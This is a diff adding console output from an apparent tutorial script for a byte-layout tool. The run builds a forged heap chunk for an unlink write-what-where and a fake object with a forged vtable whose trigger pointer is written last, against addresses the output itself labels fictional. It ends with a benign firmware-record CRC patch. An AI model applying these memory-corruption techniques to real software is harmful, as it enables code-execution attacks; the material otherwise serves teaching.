@@ -1,0 +1,123 @@
+$ python3 ex08_borrowed_structures.py
+---- part 1: the forged chunk (the overlap is the exploit) ----
+step 1: the forgery, undeclared -> CHK-001 names every byte-share
+check: 2 errors, 0 warnings, 2 pending
+ERROR CHK-001 [msg.body, msg.fake_chunk]: placement extents overlap without a declared alias  hint: declare intent: region.at(..., over=(other,), why=...)
+ERROR CHK-001 [msg.body, msg.fake_foot]: placement extents overlap without a declared alias  hint: declare intent: region.at(..., over=(other,), why=...)
+pending symbols: write_target, write_value
+refused: final emit refused: check errors:
+
+step 2: the same bytes, declared -> the overlap is the design, not a bug
+declared with over=/why=: errors = []
+msg.body[8].word (body[+0x20]) @ msg+0x28
+cell: write_target - 0xc width=4 deliver=NORMAL
+unbound: write_target -- bind() completes this cell
+aliases: fake_chunk (why: forged header rides the message tail -- the overlap IS the exploit)
+
+step 3: the write, spelled out -- bk/fd wait for the where/what to exist
+region msg (base=msg_base, fill=0x00)
+  +0x0000 w4 00000011  [msg.hdr.op]
+  +0x0004 w4 ????????  [msg.hdr.body_len]
+  +0x0008 w4 50414430  [msg.body[0].word]
+  +0x000c w4 50414431  [msg.body[1].word]
+  +0x0010 w4 50414432  [msg.body[2].word]
+  +0x0014 w4 50414433  [msg.body[3].word]
+  +0x0018 w4 50414434  [msg.body[4].word]
+  +0x001c w4 50414435  [msg.body[5].word]
+  +0x0020 w4 feedc0de  [msg.fake_chunk.canary]
+  +0x0024 w2     0008  [msg.fake_chunk.size]
+  +0x0026 w2     0001  [msg.fake_chunk.flags]
+  +0x0028 w4 ????????  [msg.fake_chunk.where]
+  +0x002c w4 ????????  [msg.fake_chunk.what]
+  +0x0038 w2     0008  [msg.fake_foot.size]
+  +0x003a w2     0000  [msg.fake_foot.resv]
+  +0x003c w4 feedc0de  [msg.fake_foot.canary]
+fixup: msg.hdr.body_len (msg+0x0004 w4) awaits write_target, write_value
+fixup: msg.fake_chunk.where (msg+0x0028 w4) awaits write_target
+fixup: msg.fake_chunk.what (msg+0x002c w4) awaits write_value
+
+step 4: bind the what/where, emit the final message
+image (64 bytes): 0000001100000038504144305041443150414432504144335041443450414435feedc0de0008000140200e5440600100000000000000000000080000feedc0de
+size tag, kept twice: head=0x0008 foot=0x0008 -- one span named in two cells cannot drift
+free(neighbor) unlinks the forgery: *(bk+0xc) = fd  ->  *(0x40200e60) = 0x40600100
+the mirror write *(fd+0x8) = bk lands inside the staging page -- fd was chosen writable for exactly that reason
+
+---- part 2: the forged object (staging order is the game) ----
+the forgery, as cells: three delivery classes, one hole where the tag goes
+region registry (base=registry_va, fill=0x00)
+  +0x000c w4 40600010  [registry.raw+0xc] ARM
+region staging (base=staging_va, fill=0x00)
+  +0x0000 w4 40003000  [staging.vtbl[0].fn]
+  +0x0004 w4 40003000  [staging.vtbl[1].fn]
+  +0x0008 w4 40001000  [staging.vtbl[2].fn]
+  +0x000c w4 40003000  [staging.vtbl[3].fn]
+  +0x0010 w4 40600000  [staging.obj.vptr] LATE
+  +0x0014 w4 00000002  [staging.obj.state]
+  +0x0018 w4 ????????  [staging.obj.tag]
+  +0x001c w4 00000000  [staging.obj.peer]
+  +0x0020 w4 40600040  [staging.obj.buf_ptr]
+  +0x0024 w4 00000008  [staging.obj.buf_len]
+  +0x0040 w4 4d504b54  [staging.raw+0x40]
+  +0x0044 w4 30303038  [staging.raw+0x44]
+fixup: staging.obj.tag (staging+0x0018 w4) awaits boot_cookie
+explain(): the two cells that must not land early
+staging.obj.vptr (obj[+0x0]) @ staging+0x10 [abs 0x40600010]
+cell: staging_va width=4 deliver=LATE
+bound: staging_va = 0x40600000 (source: fiction: reclaimed chunk, address known from the free)
+registry+0xC @ registry+0xC [abs 0x4020000C]
+cell: staging_va + 0x10 width=4 deliver=ARM
+bound: staging_va = 0x40600000 (source: fiction: reclaimed chunk, address known from the free)
+stage(): NORMAL walks right past +0x10 -- the vptr lands [LATE], the trigger not at all
+group 1 [NORMAL] 10 cells
+  0x40600000 <- 40003000
+  0x40600004 <- 40003000
+  0x40600008 <- 40001000
+  0x4060000c <- 40003000
+  0x40600014 <- 00000002
+  0x4060001c <- 00000000
+  0x40600020 <- 40600040
+  0x40600024 <- 00000008
+  0x40600040 <- 4d504b54
+  0x40600044 <- 30303038
+group 2 [LATE] 1 cells
+  0x40600010 <- 40600000
+refused (unconfirmed): finalize() refused: unconfirmed groups [1, 2]
+refused (unresolved): finalize() refused: unresolved symbols ['boot_cookie']
+leak lands: bind the cookie, finalize() -- the tag fixup, then ARM last
+group 3 [NORMAL] 1 cells
+  0x40600018 <- b007c0de
+group 4 [ARM] 1 cells
+  0x4020000c <- 40600010
+ledger: stage stage confirm confirm bind arm_intent finalize confirm confirm
+
+---- part 3: the record patch (no exploit, same discipline) ----
+step 1: the record, as dumped from flash
+original record:
+  +0x00  4d4b43460000000200000001000005dc
+  +0x10  6d6572696469616e2d6d6b3100000000
+  +0x20  00000000000000000000000000000000
+  +0x30  000000000000000000000000d6485fab
+stored crc: 0xd6485fab; bootloader replay: errors = []
+
+step 2: the footgun, reproduced -- patch two fields by hand, keep the old crc
+check: 1 error, 0 warnings, 0 pending
+ERROR CHK-005 [bootchk.raw+0x0]: reduce crc32_mpeg2 = 0x5d53cf9e, expected 0xd6485fab  hint: fix the expectation or the span contents
+
+step 3: the cento patch -- raw words own the dump, a typed view rewrites three cells
+check: 3 errors, 0 warnings, 0 pending
+ERROR CHK-008 [flash_rec.raw[15].word, flash_rec.rec.crc]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+ERROR CHK-008 [flash_rec.raw[2].word, flash_rec.rec.boot_flags]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+ERROR CHK-008 [flash_rec.raw[3].word, flash_rec.rec.mtu]: cell rewritten by a different owner (last-writer-wins)  hint: if intended: layout.allow_rewrite(cell, reason=...); else fix the collision
+check: 0 errors, 0 warnings, 0 pending; 3 waivers on the ledger
+waived rewrite flash_rec+0x0008: patch: set VERBOSE_BOOT (0x4) for bring-up logging
+waived rewrite flash_rec+0x000c: patch: raise mtu 1500 -> 9000 for the capture rig
+waived rewrite flash_rec+0x003c: recompute the tail crc over the patched body
+
+step 4: emit; the crc is right by construction
+patched record:
+  +0x00  4d4b4346000000020000000500002328
+  +0x10  6d6572696469616e2d6d6b3100000000
+  +0x20  00000000000000000000000000000000
+  +0x30  0000000000000000000000005d53cf9e
+words changed: +0x08, +0x0c, +0x3c  (we patched two; the crc came free)
+crc: 0xd6485fab -> 0x5d53cf9e; bootloader replay: errors = []
